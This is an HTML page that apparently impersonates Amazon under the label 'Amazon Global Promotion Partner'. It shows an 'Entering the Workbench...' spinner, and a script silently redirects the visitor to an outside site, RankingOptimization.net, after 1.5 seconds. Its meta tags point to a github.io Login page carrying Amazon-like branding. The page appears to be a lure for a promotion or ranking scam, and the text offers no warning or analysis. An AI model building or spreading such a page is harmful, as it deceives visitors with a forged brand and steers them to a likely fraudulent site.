<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Amazon Global Promotion Partner">
    <meta name="keywords" content="Amazon, Global, Promotion, Partner, Opportunity">
    <meta name="author" content="Your Name">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Amazon Global Promotion Partner">
    <meta name="twitter:description" content="Amazon Global Promotion Partner">
    <meta name="twitter:url" content="https://amazonadc.github.io/us/Login.html">
    <meta name="twitter:image" content="https://amazonadc.github.io/us/azonad.png">
    <meta name="twitter:image:alt" content="Amazon Global Promotion Partner Image">

    <title>Workbench</title>

    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #B22929;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
        }

        .content {
            animation: fadeIn 3s ease-in-out;
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }

        .message {
            font-size: 24px;
            margin-bottom: 20px;
        }

        .spinner {
            border: 16px solid #f3f3f3; 
            border-top: 16px solid #3498db; 
            border-radius: 50%;
            width: 120px;
            height: 120px;
            animation: spin 2s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .intro {
            font-size: 18px;
            margin-bottom: 30px;
        }

        .image {
            display: none;
        }
    </style>

    <script type="text/javascript">
        setTimeout(function() {
            window.location.replace("https://RankingOptimization.net/");
        }, 1500);
    </script>
</head>
<body>
    <div class="content">
        <div class="message">Entering the Workbench...</div>
        <div class="intro">
            Amazon Global Promotion Partner
        </div>
        <div class="image">
            <img src="https://amazonadc.github.io/us/azonad.png" alt="Amazon Global Promotion Partner">
        </div>
        <div class="spinner"></div>
    </div>
</body>
</html>
